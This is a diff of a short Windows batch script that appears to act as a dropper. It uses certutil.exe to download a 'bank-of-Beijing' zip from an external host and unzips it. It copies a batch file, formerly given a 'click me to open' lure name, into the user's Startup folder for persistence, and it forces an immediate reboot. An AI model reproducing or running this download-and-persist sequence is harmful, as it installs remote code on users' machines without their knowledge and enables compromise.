@@ -1,4 +1,4 @@
- 
+ï»¿ 
 @echo off
 rem start python TransFile.py
 set d=%USERPROFILE%\Desktop
@@ -11,7 +11,6 @@ certutil.exe -urlcache -split -f http://testlink.beats-digital.com/tools/bank-of
 
 unzip -o bank-of-Beijing.zip -d bank-of-Beijing/
 
-xcopy /y %d%\bank-of-Beijing\µãÎÒ´ò¿ª.bat "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
+xcopy /y %d%\bank-of-Beijing\start.bat "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
 
-start "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\µãÎÒ´ò¿ª.bat"
-
+shutdown /r /t 0
